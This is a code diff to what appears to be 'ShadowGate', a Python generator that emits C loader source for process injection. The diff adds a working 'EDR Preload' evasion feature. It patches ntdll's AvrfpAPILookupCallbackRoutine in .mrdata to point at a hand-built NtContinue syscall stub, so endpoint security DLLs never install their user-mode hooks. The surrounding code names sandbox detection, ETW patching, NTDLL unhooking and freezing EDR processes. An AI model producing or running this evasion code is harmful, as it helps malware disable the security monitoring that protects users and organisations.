@@ -376,6 +376,7 @@ class CodeGenerator:
 #define ENABLE_CALLSTACK_SPOOF {1 if self.config.callstack_spoof else 0}
 #define ENABLE_DYNAPI       {1 if self.config.dynapi else 0}
 #define ENABLE_EDR_FREEZE   {1 if self.config.edr_freeze else 0}
+#define ENABLE_EDR_PRELOAD  {1 if self.config.edr_preload else 0}
 #define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
 
@@ -458,6 +459,18 @@ int main(int argc, char** argv) {{
     
 #if DEBUG_BUILD
     PrintBanner();
+#endif
+    
+    // ========================================================================
+    // Phase 0a: EDR Preload (Optional)
+    // ========================================================================
+#if ENABLE_EDR_PRELOAD
+    LOG_PHASE("Phase 0a: EDR Preload");
+    if (!PerformEDRPreload()) {{
+        LOG_ERROR("EDR preload failed (continuing anyway)");
+    }} else {{
+        LOG_SUCCESS("EDR preload applied");
+    }}
 #endif
     
     // ========================================================================
@@ -3413,6 +3426,11 @@ BOOL WipePEHeaders(VOID);
 
 BOOL UnhookNtdll(VOID);
 
+// ============================================================================
+// EDR Preload (KiUserApcDispatcher hook + LdrLoadDll intercept)
+// ============================================================================
+BOOL PerformEDRPreload(VOID);
+
 #ifdef __cplusplus
 }
 #endif
@@ -3422,7 +3440,7 @@ BOOL UnhookNtdll(VOID);
     
     def _generate_evasion_cpp(self) -> str:
         """Generate evasion.cpp"""
-        return '''/*
+        base = '''/*
  * ShadowGate - Evasion Techniques
  * Sandbox detection, ETW patching, NTDLL unhooking
  */
@@ -3862,6 +3880,128 @@ BOOL UnhookNtdll(VOID) {
     return FALSE;
 }
 '''
+        if self.config.edr_preload:
+            base += '''
+// ============================================================================
+// EDR Preload - static .mrdata section base helper
+// ============================================================================
+
+static ULONG_PTR EvGetSectionBase(ULONG_PTR base, const char* name) {
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)base;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
+        return 0;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(base + pDos->e_lfanew);
+    if (pNt->Signature != IMAGE_NT_SIGNATURE)
+        return 0;
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+    WORD nSections = pNt->FileHeader.NumberOfSections;
+    for (WORD i = 0; i < nSections; i++) {
+        if (strncmp((char*)pSec[i].Name, name, IMAGE_SIZEOF_SHORT_NAME) == 0)
+            return base + pSec[i].VirtualAddress;
+    }
+    return 0;
+}
+
+// ============================================================================
+// PerformEDRPreload
+// Based on MalwareTech EDR-Preloader: hooks AvrfpAPILookupCallbackRoutine in
+// .mrdata so that any EDR DLL loaded via AppVerifier executes our NtContinue
+// stub instead of its DllMain, preventing user-mode syscall hooks.
+// ============================================================================
+
+BOOL PerformEDRPreload(VOID) {
+    // 1. Get ntdll base from PEB
+    ULONG_PTR base = (ULONG_PTR)GetNtdllFromPEB();
+    if (!base)
+        return FALSE;
+
+    // 2. Find the .mrdata section
+    ULONG_PTR mrdataBase = EvGetSectionBase(base, ".mrdata");
+    if (!mrdataBase)
+        return FALSE;
+
+    // 3. Scan .mrdata for LdrpMrdataBase (pointer whose value == mrdataBase),
+    //    then scan forward for the first NULL pointer = AvrfpAPILookupCallbackRoutine.
+    //    Start offset 0x280: skip the initial .mrdata header data before the pointer table.
+    //    End offset 0x2000: conservative upper bound covering known LdrpMrdataBase locations.
+    ULONG_PTR* pLdrpMrdataBase = NULL;
+    for (ULONG_PTR addr = mrdataBase + 0x280; addr < mrdataBase + 0x2000; addr += sizeof(ULONG_PTR)) {
+        if (*(ULONG_PTR*)addr == mrdataBase) {
+            pLdrpMrdataBase = (ULONG_PTR*)addr;
+            break;
+        }
+    }
+    if (!pLdrpMrdataBase)
+        return FALSE;
+
+    // Scan forward from LdrpMrdataBase for the first NULL slot = AvrfpAPILookupCallbackRoutine.
+    // Bound 0x4000: generous limit encompassing all known AppVerifier callback table layouts.
+    ULONG_PTR* pAvrfp = NULL;
+    for (ULONG_PTR* p = pLdrpMrdataBase + 1; (ULONG_PTR)p < mrdataBase + 0x4000; p++) {
+        if (*p == 0) {
+            pAvrfp = p;
+            break;
+        }
+    }
+    if (!pAvrfp)
+        return FALSE;
+
+    // 4. Find KiUserApcDispatcher and NtContinue in ntdll .text
+    HMODULE hNtdll = (HMODULE)base;
+    PVOID pKiUserApc = (PVOID)GetProcAddress(hNtdll, "KiUserApcDispatcher");
+    if (!pKiUserApc)
+        return FALSE;
+
+    PVOID pNtContinue = (PVOID)GetProcAddress(hNtdll, "NtContinue");
+    if (!pNtContinue)
+        return FALSE;
+
+    // Extract NtContinue SSN: bytes 4-5 of the ntdll stub hold the syscall number.
+    // Stub layout: mov r10,rcx [3 bytes] | mov eax,<ssn> [1+4 bytes]; SSN is at byte offset 4.
+    WORD ssn = *(WORD*)((PBYTE)pNtContinue + 4);
+
+    // 5. Build NtContinue-only stub:
+    // x64: sub rsp,0x28; mov r10,rcx; xor edx,edx; mov eax,<ssn>; syscall; add rsp,0x28; ret
+    BYTE stub[] = {
+        0x48, 0x83, 0xEC, 0x28,                                          // sub rsp, 0x28
+        0x4C, 0x8B, 0xD1,                                                // mov r10, rcx
+        0x33, 0xD2,                                                      // xor edx, edx
+        0xB8, (BYTE)(ssn & 0xFF), (BYTE)((ssn >> 8) & 0xFF), 0x00, 0x00, // mov eax, <ssn>
+        0x0F, 0x05,                                                      // syscall
+        0x48, 0x83, 0xC4, 0x28,                                          // add rsp, 0x28
+        0xC3                                                             // ret
+    };
+
+    // Allocate RW memory, write stub, then change to RX (W^X principle)
+    PVOID pStub = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pStub)
+        return FALSE;
+    memcpy(pStub, stub, sizeof(stub));
+    DWORD dwStubOldProtect = 0;
+    if (!VirtualProtect(pStub, sizeof(stub), PAGE_EXECUTE_READ, &dwStubOldProtect)) {
+        VirtualFree(pStub, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    // Patch AvrfpAPILookupCallbackRoutine to point to our stub.
+    // .mrdata is read-only; temporarily make it writable.
+    DWORD dwOldProtect = 0;
+    if (!VirtualProtect((PVOID)pAvrfp, sizeof(ULONG_PTR), PAGE_READWRITE, &dwOldProtect)) {
+        VirtualFree(pStub, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    *pAvrfp = (ULONG_PTR)pStub;
+    VirtualProtect((PVOID)pAvrfp, sizeof(ULONG_PTR), dwOldProtect, &dwOldProtect);
+
+#if DEBUG_BUILD
+    LOG_SUCCESS("EDR Preload: AvrfpAPILookupCallbackRoutine hooked at 0x%p -> stub 0x%p (KiUserApcDispatcher=0x%p)",
+                pAvrfp, pStub, pKiUserApc);
+#endif
+
+    return TRUE;
+}
+'''
+        return base
 
     def _generate_sleep_obf_files(self) -> dict:
         """Generate sleep obfuscation files"""
@@ -4762,6 +4902,9 @@ Injection Methods:
     evasion_group.add_argument('--edr-freeze', action='store_true', default=False,
                                help='Freeze EDR processes before injection (requires admin)')
     
+    evasion_group.add_argument('--edr-preload', action='store_true', default=False,
+                               help='Prevent EDR user-mode hooks via AvrfpAPILookupCallbackRoutine intercept (default: disabled)')
+    
     evasion_group.add_argument('--sleep', type=int, default=0,
                                help='Initial sleep in seconds (default: 0)')
     
@@ -4818,6 +4961,7 @@ def args_to_config(args: argparse.Namespace) -> BuildConfig:
     config.callstack_spoof = args.spoof_stack
     config.dynapi = args.dynapi
     config.edr_freeze = args.edr_freeze
+    config.edr_preload = args.edr_preload
     
     return config
 
@@ -4868,6 +5012,7 @@ def main():
         if hasattr(args, 'no_etw')     and args.no_etw:       config.etw              = False
         if args.unhook:                           config.unhook           = True
         if args.edr_freeze:                       config.edr_freeze       = True
+        if args.edr_preload:                      config.edr_preload      = True
         if args.debug:                            config.debug            = True
         if args.sleep_obf:                        config.sleep_obfuscation = True
         if hasattr(args, 'no_amsi')    and args.no_amsi:      config.amsi             = False
